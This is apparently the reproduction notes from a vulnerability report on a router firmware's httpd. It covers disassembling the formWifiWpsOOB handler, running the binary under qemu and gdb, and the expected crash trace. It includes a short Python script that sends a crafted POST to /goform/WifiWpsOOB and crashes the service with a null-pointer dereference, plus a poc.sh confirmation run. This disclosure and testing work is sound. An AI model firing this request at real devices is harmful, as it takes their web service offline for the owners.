# Reproduction commands

The commands below produce everything in `evidence/`. They assume the firmware is unpacked
at `./squashfs-root` and `httpd` has been copied out as `./httpd`.

## Preparation

```
arm-linux-gnueabi-readelf -h httpd | head -5
arm-linux-gnueabi-readelf -sW httpd | grep -w formWifiWpsOOB
```

`formWifiWpsOOB` is at `0x9b674`, size 776.

## Disassembly

```
arm-linux-gnueabi-objdump -d --no-show-raw-insn \
    --start-address=0x9b674 --stop-address=0x9b97c httpd
```

Look for:

```
09b71c  ldr  r0, [fp, #-16]
09b720  bl   atoi@plt
09b74c  cmp  r3, #0
```

## Crash under the debugger

Start the target with the gdb stub:

```
setsid qemu-arm -g 1234 -L ./ bin/httpd &
```

Attach with the session in `../gdb-session.txt`, after pointing it at your unpacked
`httpd` and your stub address:

```
gdb-multiarch -q -x ../gdb-session.txt > capture.txt
```

Trigger it from another shell:

```python
import socket

req = (b'POST /goform/WifiWpsOOB HTTP/1.1\r\nHost: 192.168.0.1\r\n'
       b'Cookie: password=x\r\nContent-Type: application/x-www-form-urlencoded\r\n'
       b'Content-Length: 5\r\n\r\nfoo=1\r\n')

s = socket.create_connection(('192.168.0.1', 80), timeout=10)
s.sendall(req)
try:
    print(s.recv(256))
except Exception as e:
    print('no response:', type(e).__name__)
```

Expected in `capture.txt`:

```
Breakpoint 1, 0x0009b720 in formWifiWpsOOB ()
argument passed to atoi   r0 = 0x0
#0  0x0009b720 in formWifiWpsOOB ()
#1  0x00017110 in websFormHandler ()
Program received signal SIGSEGV, Segmentation fault.
r0 = 0x0    r6 = 0x0    pc = 0x3fdedafc
=> 0x3fdedafc:  ldrb  r3, [r6]
Cannot access memory at address 0x0
```

## Two-case check

```
./poc.sh 192.168.0.1
```

Expected:

```
[2/4] baseline - 'index' present  -> HTTP = 200
[3/4] trigger  - 'index' absent   -> HTTP = 000
[4/4] confirming the service is gone -> HTTP = 000
```

## Whole-binary scan

The scanners behind `evidence/05-uniqueness-scan.md` are in `../tools/`; see that file for
the criterion and the invocation.

## Environment notes

- The emulated device listens on `192.168.0.1`; run the trigger from a namespace that can
  reach it (inside the emulation container is simplest).
- Builds that answer `302` on first contact need the server-issued cookie first. `poc.sh`
  handles this.
- The firmware is used unmodified.
